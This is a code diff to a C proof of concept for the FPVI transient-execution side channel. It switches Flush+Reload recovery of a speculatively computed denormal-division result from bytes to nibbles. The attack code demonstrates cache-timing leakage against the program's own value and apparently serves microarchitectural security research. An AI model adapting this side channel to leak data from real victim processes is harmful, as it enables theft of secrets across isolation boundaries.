@@ -15,7 +15,7 @@
 #include "asm.h"
 
 #define NUM_SAMPLES 1000
-#define STRIDE 4096
+#define STRIDE 2048
 #define ITERATIONS 20
 #define ROUNDS 10
 
@@ -75,8 +75,9 @@ uint64_t get_cache_threshold(){
     return threshold;
 }
 
+
 void reload_and_measure(unsigned char *reloadbuffer, size_t *cache_hits, uint64_t threshold) {
-    for(int j = 0; j < 256; j++) {  
+    for(int j = 0; j < 16; j++) {
         mfence();
         uint64_t start = rdtscp();
         *(volatile char*)(&reloadbuffer[j * STRIDE]);
@@ -98,43 +99,47 @@ uint64_t make_denormal() {
     return rand_val;
 }
 
+
 int main(int argc, char *argv[]) {
     uint64_t CACHE_THRESHOLD = get_cache_threshold();
-    int RELOADBUFFER_SIZE = 256 * STRIDE;  
+    int RELOADBUFFER_SIZE = 16 * STRIDE;
 
     unsigned char *reloadbuffer = mmap(NULL, RELOADBUFFER_SIZE, PROT_READ | PROT_WRITE,
-                                      MAP_ANONYMOUS |MAP_HUGETLB | MAP_PRIVATE | MAP_POPULATE, -1, 0);
+                                      MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
     memset(reloadbuffer, 0, RELOADBUFFER_SIZE);
     
     printf("CACHE THRESHOLD = %lu cycles\n\n", CACHE_THRESHOLD);
 
+ 
+    
     uint64_t dx = make_denormal();
     uint64_t dy = make_denormal();
 
     printf("dx = 0x%016lx\n", dx);
     printf("dy = 0x%016lx\n", dy);
     
-    // get architectural result
+    // get architectural result for
     double result = (*(double*)&dx) / (*(double*)&dy);
     uint64_t architectural_result = *(uint64_t*)&result;
 
     printf("architectural result = 0x%016lx\n\n", architectural_result);
     
-    // Recover transient result byte by byte
+    // Recover transient result nibble by nibble
     uint64_t transient_result = 0;
     
-    for (int byte_index = 0; byte_index < 8; byte_index++) {  
-        size_t cache_hits[256] __attribute__((aligned(4096))) = {0};  
+    for (int nibble_index = 0; nibble_index < 16; nibble_index++) {
+        size_t cache_hits[16] = {0};
+
         for (int i = 0; i < ITERATIONS; i++) {
             // 1. Flush
-            for (int j = 0; j < 256; j++) { 
+             for (int j = 0; j < 16; j++) {
                 clflush(&reloadbuffer[j * STRIDE]);
             }
             mfence();
 
             // 2. FPVI 
             asm volatile(
-                ".rept 2                   \n\t" 
+                ".rept 2                    \n\t" 
                 "  movq  %[x], %%xmm0       \n\t"  
                 "  movq  %[y], %%xmm1       \n\t"  
                 "  divsd %%xmm1, %%xmm0     \n\t"
@@ -142,15 +147,15 @@ int main(int argc, char *argv[]) {
                 "movq %%xmm0, %%rax         \n\t"
                 "mov  %[shift], %%ecx       \n\t"
                 "shrq %%cl, %%rax           \n\t"
-                "and  $0xff, %%rax          \n\t"  // 8 bits for byte 
-                "shl  $12, %%rax            \n\t"  // STRIDE shift to calculate cache offset
+                "and  $0xf, %%rax           \n\t"  // 4 bits for nibble
+                "shl  $11, %%rax            \n\t"  // STRIDE shift to calculate cache offset
                 "add  %[buf], %%rax         \n\t"
-                "movb (%%rax), %%al         \n\t"  // access to bring into cache
+                "movb (%%rax), %%al         \n\t"  //access to bring into cache
                 :
                 : [x]"m"(dx),
                   [y]"m"(dy),
                   [buf]"r"(reloadbuffer),
-                  [shift]"r"(byte_index * 8)        
+                  [shift]"r"(nibble_index * 4)
                 : "rax","rcx","xmm0","xmm1","memory"
             );
    
@@ -158,22 +163,23 @@ int main(int argc, char *argv[]) {
             reload_and_measure(reloadbuffer, cache_hits, CACHE_THRESHOLD);
         }
 
-        // extract the 8-bit architectural byte with index byte_index
-        uint8_t architectural_byte = (architectural_result >> (byte_index * 8)) & 0xff;
-        uint8_t transient_byte = architectural_byte;
+        // extract the 4 bit architectural nibble with index nibble_index
+        uint8_t architectural_nibble = (architectural_result >> (nibble_index * 4)) & 0xf;
+        uint8_t transient_nibble = architectural_nibble;
         
-        // get the most hit that is not the architectural one 
-        for(int j = 0; j < 256; j++) {
-            if(cache_hits[j] > 5 && j != architectural_byte) {
-                transient_byte = j;
+        
+        //get the most hit that is not the architectural one 
+        for(int j = 0; j < 16; j++) { // exclude the correct cache hit we are not interested in teh architectural one
+            if(cache_hits[j] > 5 && j != architectural_nibble) {
+                transient_nibble = j;
                 break;
             }
         }
         
-        // to reconstruct the transient result
-        transient_result |= ((uint64_t)transient_byte) << (byte_index * 8);
+        //to reconstruct the transient result
+        transient_result |= ((uint64_t)transient_nibble) << (nibble_index * 4);
         
-        printf("Byte %d:    0x%02x (hits=%zu)\n", byte_index, transient_byte, cache_hits[transient_byte]);
+        printf("Nibble %d:    0x%x (hits=%zu)\n", nibble_index, transient_nibble, cache_hits[transient_nibble]);
     }
     
     printf("\nTRANSIENT LEAKED RESULT: 0x%016lx\n", transient_result);
